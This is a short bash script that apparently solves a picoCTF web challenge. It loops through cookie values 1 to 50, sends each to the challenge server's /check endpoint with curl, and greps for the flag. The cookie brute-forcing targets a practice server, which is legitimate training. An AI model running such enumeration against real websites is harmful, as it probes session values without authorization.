
URL="http://mercury.picoctf.net:54219/"

for COOKIE_VAL in {1..50}
do
   FLAG=`curl -s  --cookie "name=$COOKIE_VAL" http://mercury.picoctf.net:54219/check | grep pico`

   if [ "$FLAG" != "" ]; then 
   	echo "Found flag with cookie=$COOKIE_VAL"
	echo "$FLAG"
	break
   fi
   
done
